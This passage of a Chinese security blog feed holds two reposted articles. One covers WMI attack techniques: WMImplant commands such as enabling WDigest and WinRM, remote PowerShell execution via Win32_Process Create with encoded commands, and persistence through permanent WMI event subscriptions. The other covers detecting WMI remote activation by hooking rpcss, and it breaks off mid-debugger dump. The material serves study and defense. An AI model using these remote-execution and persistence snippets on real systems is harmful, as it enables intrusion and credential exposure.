<span class="builtin-name">Run</span> a command line command <span class="keyword">and</span> receive the output</div><div class="line">disable_wdigest                     -   Removes registry value UseLogonCredential</div><div class="line">disable_winrm                       -   Disables WinRM on the targeted system</div><div class="line">enable_wdigest                      -   Adds registry value UseLogonCredential</div><div class="line">enable_winrm                        -   Enables WinRM on the targeted system</div><div class="line">registry_mod                        -   Modify the registry on the targeted machine</div><div class="line">remote_posh                         -   <span class="builtin-name">Run</span> a PowerShell<span class="built_in"> script </span>on a remote machine <span class="keyword">and</span> receive the output</div><div class="line">sched_job                           -   Manipulate scheduled jobs</div><div class="line">service_mod                         -   Create, delete, <span class="keyword">or</span> modify<span class="built_in"> system </span>services</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Invoke-WMIObfuscatedPSCommand</code>函数简单的介绍过，其底层就是使用Win32_Process类的Create方法实现的。剩下就是构造一个远程命令,这个命令主要就是利用 Invoke-Command的<code>-sc</code>参数。<code>-sc</code>参数可以添加一个代码块。这样就可以执行Powershell代码块。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash">remote_command = <span class="string">"powershell `<span class="variable">$command1</span> =  &#123;<span class="variable">$ExecCommand</span>&#125;; `<span class="variable">$command2</span> = Invoke-Command -sc `<span class="variable">$command1</span> | Out-String; Set-ItemProperty -Path HKCU:\SOFTWARE\EvilKey -Name Result  -Value `<span class="variable">$command2</span>"</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此以外,powershell自带-Command参数，也可以添加代码块，还可以进行加密。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash">remote_command = <span class="string">"powershell.exe powershell -Command &#123;<span class="variable">$command</span>&#125;"</span></span></div><div class="line"><span class="meta">$</span><span class="bash">bytes = [System.Text.Encoding]::Unicode.GetBytes(<span class="variable">$command</span>)</span></div><div class="line"><span class="meta">$</span><span class="bash">encodedCommand = [Convert]::ToBase64String(<span class="variable">$bytes</span>)</span></div><div class="line"><span class="meta">$</span><span class="bash">process = Invoke-WmiMethod -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span> -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist <span class="variable">$remote_command</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;假如需要利用powershell在远程机器创建一个文件，需要使用到如下代码块。使用WMImplant远程执行，效果如下。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$filepath</span> =<span class="string">'C:\BaiduNetdiskDownload\123.txt'</span>;</div><div class="line">New-Item <span class="variable">$filepath</span> -<span class="built_in">type</span> file<span class="string">"</span></div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20211114/5eU1GFiefImT.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211114/3oCtYnVTLq49.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当然，也许，你不需要执行一个代码块，仅仅需要执行一个<code>whoami命令</code>。command_exec命令也是可以胜任的。<br>   <img src="http://hacky.wang/blog/20211114/8zFqzgBYgw0D.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211114/5wp3jz3GejPd.png?imageslim" alt="mark"></p><h2 id="0x04-WMI事件订阅机制"><a href="#0x04-WMI事件订阅机制" class="headerlink" title="0x04 WMI事件订阅机制"></a>0x04 WMI事件订阅机制</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI事件分为两类，本地事件订阅和永久性事件订阅。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本地事件订阅的生命周期是进程生命周期，而永久性事件订阅可以在任何事件接收WMI事件，其保存在WMI存储库中，永久性事件订阅使用一组永久的过滤器捕获WMI事件，即事件筛选器(Event Filter)，一个永久的事件消费者(Event Constumer),以及两者之间的绑定关系。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;事件筛选器是一个__EventFilter类，用于描述WMI将哪些事件传递给事件消费者，即通过WQL语句筛选出触发事件消费者的条件。事件过滤器可以指定内部或外部事件；并且过滤器可以引用源自命名空间的事件。事件筛选器包括四个参数EventNamespace(事件命名空间)，Name(筛选器名称),Query(筛选过滤语句),QueryLanguage(语句类型)<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">EventNamespace = 'root/cimv2'</div><div class="line">Name = $FilterName</div><div class="line">Query = $Query</div><div class="line">QueryLanguage = 'WQL'</div><div class="line">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;事件消费者，即事件被触发之后，需要选择执行的行为，主要包含以下事件消费者，分别可以对应事件执行不同的操作，分别是运行脚本，发送电子邮件，写入日志，记录NT事件日志，命令行运行程序。</p><ul><li>ActiveScriptEventConsumer(脚本事件消费者)</li><li>LogFileEventConsumer(日志文件事件消费者)</li><li>NTEventLogEventConsumer(NT事件日志事件消费者)</li><li>SMTPEventConsumer(邮件事件消费者)</li><li>CommandLineEventConsumer(命令行事件消费者)</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中，永久性事件订阅中，经常使用ActiveScriptEventConsumer和 CommandLineEventConsumer两类事件消费者。本文中使用的是CommandLineEventConsumer。命令行事件消费者主要有以下四个参数,Name(事件消费者名)，ExecutablePath(执行路径)，CommandLineTemplate(命令行)，RunInteractively(交互式运行)<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Name = $ConsumerName</div><div class="line">ExecutablePath = $ExecutablePath</div><div class="line">CommandLineTemplate = $CommandLineTemplate</div><div class="line">RunInteractively=<span class="string">"false"</span></div><div class="line"></div><div class="line">Set-WmiInstance -Namespace <span class="string">"root\subscription"</span> -Class 'CommandLineEventConsumer' -Arguments  $ConsumerArgs</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>__FilterToConsumerBinding</code>建立筛选器和事件消费者的绑定关系。<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$FilterToConsumerBinding</span> = <span class="keyword">Set</span>-WmiInstance -Namespace root\subscription -<span class="keyword">Class</span> __FilterToConsumerBinding -Arguments <span class="built_in">$FilterToConsumerArgs</span></div></pre></td></tr></table></figure></p><h2 id="0x05-WMI的检测"><a href="#0x05-WMI的检测" class="headerlink" title="0x05 WMI的检测"></a>0x05 WMI的检测</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们介绍过WMI现行支持两套技术，分别为DCOM协议和WinRM。DCOM协议简单的话是基于RPC协议，但是又不是完全独立于RPC协议的。他使用了RPC协议的结构体，与RPC共用了数据头和数据体。所以DCOM协议常被称为ORPC。RPC是一种编程模型，主要用于应用程序实现远程过程调用，微软的DCEPRC即是对远程过程调用的一种实现和扩展。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPC通信采用Client/Server的通信结构。如下图所示是OPC通信的流程图。首先OPC客户端先通过TCP向OPC服务端发起TCP请求，在建立连接之后，建立绑定。接着通过IRemoteActivation接口的RemoteCreateInstance方法进行DCOM激活。<br>    <img src="http://hacky.wang/blog/20211120/W3utraJcPegW.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20211120/psILH4lNIiG9.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20211120/Jq6qTWnCuu6u.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过查看数据报文，发现DCOM激活存在一下6中激活属性，其中SecurityInfoData包含着连接的计算机名，InstantiationInfoData中属性中包含了实例化对象的CLSID。</p><ul><li>SpecialPropertiesData</li><li>InstantiationInfoData</li><li>ActivationContextInfoData</li><li>SecurityInfoData</li><li>LocationInfoData</li><li>ScmRequestInfoData<br>  <img src="http://hacky.wang/blog/20211120/Egl9pBGLzSTz.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20211120/ClSj8cY6CwTc.png?imageslim" alt="mark"></li></ul><h2 id="0x05-参数"><a href="#0x05-参数" class="headerlink" title="0x05 参数"></a>0x05 参数</h2><ul><li><a href="https://github.com/FortyNorthSecurity/WMImplant" target="_blank" rel="external">https://github.com/FortyNorthSecurity/WMImplant</a></li><li><a href="http://www.smatrix.org/forum/forum.php?mod=viewthread&amp;tid=887&amp;extra=page%3D1" target="_blank" rel="external">http://www.smatrix.org/forum/forum.php?mod=viewthread&amp;tid=887&amp;extra=page%3D1</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文转载于跳跳糖安全社区，原文链接为&lt;a href=&quot;https://tttang.com/archive/1624/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1624/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="windows系统" scheme="https://findream.github.io/categories/windows%E7%B3%BB%E7%BB%9F/"/>
    
    
  </entry>
  
  <entry>
    <title>WMI检测思路与实现</title>
    <link href="https://findream.github.io/2021/11/06/WMI%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <id>https://findream.github.io/2021/11/06/WMI检测思路与实现/</id>
    <published>2021-11-06T04:02:11.000Z</published>
    <updated>2022-09-14T13:16:51.623Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文转载于跳跳糖安全社区，原文链接为<a href="https://tttang.com/archive/1639/" target="_blank" rel="external">https://tttang.com/archive/1639/</a></li></ul><a id="more"></a><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在《WMI攻守之道》中，我们通过分析WMI产生的流量数据了解到WMI通过DCE/RPC协议进行通信，这个协议主要由DCOM远程激活机制和NTLM身份认证。DCOM远程激活是WMI远程连接的必要步骤，所以可以通过检测DCOM远程激活，进而检测WMI连接。<br>   <img src="http://hacky.wang/blog/20211106/blFlBnEqI8wh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而在windows系统中存在多个DCOM对象，所以需要通过CLSID判断是否是WMI的CLSID。继而检测是否是WMI远程连接。而WMI的CLSID值为<code>8BC3F05E-D86B-11D0-A075-00C04FB68820</code>。本文行文仓促，如有错误，请各位积极指正。<br>   <img src="http://hacky.wang/blog/20211106/B90kJHgsFhEt.png?imageslim" alt="mark"><br><!-- more --></p><h2 id="0x02-WMI检测思路"><a href="#0x02-WMI检测思路" class="headerlink" title="0x02 WMI检测思路"></a>0x02 WMI检测思路</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<a href="https://bbs.pediy.com/thread-248128.htm" target="_blank" rel="external">CVE-2015-2370之DCOM DCE/RPC协议原理详细分析</a>一文中，详细描述了DCOM远程激活机制的细节，远程激活一共有两种方式：一种是采用CoCreateInstanceEx方式指定远程服务器和激活身份等参数调用rpscss的IRemoteSCMActivator接口的RemoteCreateInstance方法激活，另外一种是客户端marshal服务端unmarshal方式。经过分析，WMI的远程激活采用的是第一种方式，即通过RemoteCreateInstance方法激活。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IRemoteSCMActivator::RemoteCreateInstance方法的原型如下，参数pActProperties指向了MInterfacePointer结构，其包含了一个OBJREF_CUSTOM对象。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">HRESULT <span class="title">RemoteCreateInstance</span>(<span class="params"></span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] handle_t rpc,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] ORPCTHIS* orpcthis,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">out</span>] ORPCTHAT* orpcthat,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>, unique] MInterfacePointer* pUnkOuter,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>, unique] MInterfacePointer* pActProperties,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">out</span>] MInterfacePointer** ppActProperties</span></span></div><div class="line"><span class="function"><span class="params"></span>)</span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MInterfacePointer结构如下，包含了ulCntData，和abData两个字段，ulCntData表示的是cbData字段的大小。abData包含OBJREF 的结构。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMInterfacePointer</span> &#123;</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ulCntData;</div><div class="line">  [size_is(ulCntData)] byte abData[];</div><div class="line">&#125; MInterfacePointer;</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20211106/Rp0PR5tK0aLp.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据微软文档的描述，pActProperties包含了一个OBJREF结构，OBJREF是 DCOM 远程协议对象引用的封送格式。OBJREF有四种不同的格式，其中由flags属性指定不同的格式。当flag为4，说明其包含OBJREF_CUSTOM结构。具体的结构说明可以参见微软文档<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31" target="_blank" rel="external">OBJREF结构</a><br>   <img src="http://hacky.wang/blog/20211106/lzBDkiAWGm3m.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OBJREF_CUSTOM结构的CLSID值为<code>{00000338-0000-0000-c000-000000000046}</code>,表示的是CLSID_ActivationPropertiesIn。其他的GUID仍然可以在微软文档中查看<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4" target="_blank" rel="external">Standards Assignments</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;包含激活属性的BLOB结构包含多个激活属性，其中实例化信息数据，请求信息数据，以及位置信息数据属性是必选的，而安全信息数据，激活上下文信息数据，实例信息数据，特殊属性数据都是可选的。<br>   <img src="http://hacky.wang/blog/20211106/ImSUrfIowNYw.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中标识WMI的CLSID存储在InstantiationInfoData，而存储连接的地址存储在SecurityInfoData中。<br>   <img src="http://hacky.wang/blog/20211106/vtV5tjCbF3vX.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211106/rSAnwNGySsBn.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RemoteCreateInstance方法位于rpcss.dll中，该函数并未导出，DCOM激活服务由系统服务RPCSS服务提供。一般的，windows系统服务都由svchost进行托管。利用<code>tasklist /SVC</code>查看。<br>   <img src="http://hacky.wang/blog/20211106/ew8URIMHTVcx.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211106/7SjXWR873Iwi.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RemoteCreateInstance方法在rpcss.dll中，rpcss.dll中存在两个RemoteCreateInstance方法，其中_RemoteCreateInstance才是IRemoteSCMActivator接口的RemoteCreateInstance方法。这里我们使用双机调试的方法查看pActProperties。上图可以看到Pid为828的进程是rpcss服务的托管进程。使用<code>!process 0 0</code>查看所有的进程，然后使用<code>.process \i eprocess</code>切换到指定进程。并在rpcss下<code>_RemoteCreateInstance</code>断点。具体如下.<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">0</span>: kd&gt; !process <span class="number">0</span> <span class="number">0</span></div><div class="line">**** NT ACTIVE PROCESS DUMP ****</div><div class="line">PROCESS <span class="number">869</span>cf690  <span class="attribute">SessionId</span>: none  <span class="attribute">Cid</span>: <span class="number">0004</span>    <span class="attribute">Peb</span>: <span class="number">00000000</span>  <span class="attribute">ParentCid</span>: <span class="number">0000</span></div><div class="line">    <span class="attribute">DirBase</span>: <span class="number">00185000</span>  <span class="attribute">ObjectTable</span>: <span class="number">8</span>a401a70  <span class="attribute">HandleCount</span>: <span class="number">511</span>.</div><div class="line">    <span class="attribute">Image</span>: System</div><div class="line"></div><div class="line">PROCESS <span class="number">88</span>c16d40  <span class="attribute">SessionId</span>: <span class="number">0</span>  <span class="attribute">Cid</span>: <span class="number">0238</span>    <span class="attribute">Peb</span>: <span class="number">7</span>ffd8000  <span class="attribute">ParentCid</span>: <span class="number">01</span>b8</div><div class="line">    <span class="attribute">DirBase</span>: <span class="number">3</span>e81a0e0  <span class="attribute">ObjectTable</span>: <span class="number">9210</span>cea8  <span class="attribute">HandleCount</span>: <span class="number">560</span>.</div><div class="line">    <span class="attribute">Image</span>: lsass.exe</div><div class="line"></div><div class="line">PROCESS <span class="number">88</span>c07030  <span class="attribute">SessionId</span>: <span class="number">0</span>  <span class="attribute">Cid</span>: <span class="number">0240</span>    <span class="attribute">Peb</span>: <span class="number">7</span>ffd9000  <span class="attribute">ParentCid</span>: <span class="number">01</span>b8</div><div class="line">    <span class="attribute">DirBase</span>: <span class="number">3</span>e81a100  <span class="attribute">ObjectTable</span>: <span class="number">921</span>e4008  <span class="attribute">HandleCount</span>: <span class="number">146</span>.</div><div class="line">    <span class="attribute">Image</span>: lsm.exe</div><div class="line"></div><div class="line">PROCESS <span class="number">8740</span>f728  <span class="attribute">SessionId</span>: <span class="number">0</span>  <span class="attribute">Cid</span>: <span class="number">02</span>a4    <span class="attribute">Peb</span>: <span class="number">7</span>ffdf000  <span class="attribute">ParentCid</span>: <span class="number">0230</span></div><div class="line">    <span class="attribute">DirBase</span>: <span class="number">3</span>e81a120  <span class="attribute">ObjectTable</span>: <span class="number">97838640</span>  <span class="attribute">HandleCount</span>: <span class="number">354</span>.</div><div class="line">    <span class="attribute">Image</span>: svchost.exe</div><div class="line"></div><div class="line">PROCESS <span class="number">88</span>c9b7e8  <span class="attribute">SessionId</span>: <span class="number">0</span>  <span class="attribute">Cid</span>: <span class="number">02</span>e0    <span class="attribute">Peb</span>: <span class="number">7</span>ffdf000  <span class="attribute">ParentCid</span>: <span class="number">0230</span></div><div class="line">    <span class="attribute">DirBase</span>: <span class="number">3</span>e81a140  <span class="attribute">ObjectTable</span>: <span class="number">97901</span>bc0  <span class="attribute">HandleCount</span>: <span class="number">315</span>.</div><div class="line">    <span class="attribute">Image</span>: HipsDaemon.exe</div><div class="line"></div><div class="line">PROCESS <span class="number">88</span>cee9c0  <span class="attribute">SessionId</span>: <span class="number">0</span>  <span class="attribute">Cid</span>: <span class="number">02</span>f8    <span class="attribute">Peb</span>: <span class="number">7</span>ffdf000  <span class="attribute">ParentCid</span>: <span class="number">0230</span></div><div class="line">    <span class="attribute">DirBase</span>: <span class="number">3</span>e81a160  <span class="attribute">ObjectTable</span>: <span class="number">978</span>f33a0  <span class="attribute">HandleCount</span>:  <span class="number">55</span>.</div><div class="line">    <span class="attribute">Image</span>: vmacthlp.exe</div><div class="line"></div><div class="line">PROCESS <span class="number">88</span>d1b030  <span class="attribute">SessionId</span>: <span class="number">0</span>  <span class="attribute">Cid</span>: <span class="number">033</span>c    <span class="attribute">Peb</span>: <span class="number">7</span>ffdf000  <span class="attribute">ParentCid</span>: <span class="number">0230</span></div><div class="line">    <span class="attribute">DirBase</span>: <span class="number">3</span>e81a180  <span class="attribute">ObjectTable</span>: <span class="number">978</span>d42e8  <span class="attribute">HandleCount</span>: <span class="number">265</span>.</div><div class="line">    <span class="attribute">Image</span>: svchost.exe</div><div class="line"></div><div class="line">PROCESS <span class="number">88</span>d32c08  <span class="attribute">SessionId</span>: <span class="number">0</span>  <span class="attribute">Cid</span>: <span class="number">0384</span>    <span class="attribute">Peb</span>: <span class="number">7</span>ffda000  <span class="attribute">ParentCid</span>: <span class="number">0230</span></div><div class="line">    <span class="attribute">DirBase</span>: <span class="number">3</span>e81a1a0  <span class="attribute">ObjectTable</span>: <span class="number">9793</span>c728  <span class="attribute">HandleCount</span>: <span class="number">446</span>.</div><div class="line">    <span class="attribute">Image</span>: svchost.exe</div><div class="line"></div><div class="line">PROCESS <span class="number">88</span>d78898  <span class="attribute">SessionId</span>: <span class="number">0</span>  <span class="attribute">Cid</span>: <span class="number">03</span>dc    <span class="attribute">Peb</span>: <span class="number">7</span>ffdf000  <span class="attribute">ParentCid</span>: <span class="number">0230</span></div><div class="line">    <span class="attribute">DirBase</span>: <span class="number">3</span>e81a1e0  <span class="attribute">ObjectTable</span>: <span class="number">8</span>c074820  <span class="attribute">HandleCount</span>: <span class="number">461</span>.</div><div class="line">    <span class="attribute">Image</span>: svchost.exe</div><div class="line"><span class="number">0</span>: kd&gt; .process /i <span class="number">88</span>d1b030</div><div class="line">You need to continue execution (press <span class="string">'g'</span> &lt;enter&gt;) for the context</div><div class="line">to be switched. When the debugger breaks in again, you will be in</div><div class="line">the new process context.</div><div class="line"><span class="number">0</span>: kd&gt; g</div><div class="line">Break instruction exception - code <span class="number">80000003</span> (first chance)</div><div class="line">nt!<span class="attribute">RtlpBreakWithStatusInstruction</span>:</div><div class="line"><span class="number">840</span>b27b8 cc              int     <span class="number">3</span></div><div class="line"><span class="number">0</span>: kd&gt; bp rpcss!_RemoteCreateInstance</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图，可以看到pActProperties+0x174存储的是CLSID，pActProperties+0x284存储的是ip地址。<br>   <img src="http://hacky.wang/blog/20211106/ujo1B0sTb55J.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211106/g5rwHE1TBuJ9.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以检测WMI的思路，可以如此实现，首先根据服务名获取Pid，然后Hook该进程的Rpcss.dll的<code>_RemoteCreateInstance</code>函数，通过判断参数pActProperties偏移为0x174处CLSID是否是WMI的CLSID，获取pActProperties+0x284的IP地址。即可检测和阻止WMI。</p><h2 id="0x03-WMI检测实现"><a href="#0x03-WMI检测实现" class="headerlink" title="0x03 WMI检测实现"></a>0x03 WMI检测实现</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当然，基于流量检测WMI是一个不错的选择，此处为了验证相关技术，故没有采用流量检测的方式，而是采用Hook的方式。但是如果要需要运用到正式环境，最好采用流量检测的方式，特别强调，这次描述的检测方法和Code都不要用于正式环境。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，Hook R3层的函数，需要将一个dll注入进程，然后Hook该函数。但是通常方法注入系统进程，会因为权限问题无法注入进程。这里我选择通过驱动，定位<code>_RemoteCreateInstance</code>函数，然后进行Hook。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在内核层Hook应用层的模块，首先需要定位目标的进程。windows内核通常使用EPROCESS 结构体描述进程信息。EPROCESS结构如下：<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">1</span>: kd&gt; dt _EPROCESS</div><div class="line">ntdll!_EPROCESS</div><div class="line">   +<span class="number">0</span>x000 <span class="attribute">Pcb              </span>: _KPROCESS</div><div class="line">   +<span class="number">0</span>x098 <span class="attribute">ProcessLock      </span>: _EX_PUSH_LOCK</div><div class="line">   +<span class="number">0</span>x0a0 <span class="attribute">CreateTime       </span>: _LARGE_INTEGER</div><div class="line">   +<span class="number">0</span>x0a8 <span class="attribute">ExitTime         </span>: _LARGE_INTEGER</div><div class="line">   +<span class="number">0</span>x0b0 <span class="attribute">RundownProtect   </span>: _EX_RUNDOWN_REF</div><div class="line">   +<span class="number">0</span>x0b4 <span class="attribute">UniqueProcessId  </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x0b8 <span class="attribute">ActiveProcessLinks </span>: _LIST_ENTRY</div><div class="line">   +<span class="number">0</span>x0c0 <span class="attribute">ProcessQuotaUsage </span>: [<span class="number">2</span>] Uint4B</div><div class="line">   +<span class="number">0</span>x0c8 <span class="attribute">ProcessQuotaPeak </span>: [<span class="number">2</span>] Uint4B</div><div class="line">   +<span class="number">0</span>x0d0 <span class="attribute">CommitCharge     </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x0d4 <span class="attribute">QuotaBlock       </span>: Ptr32 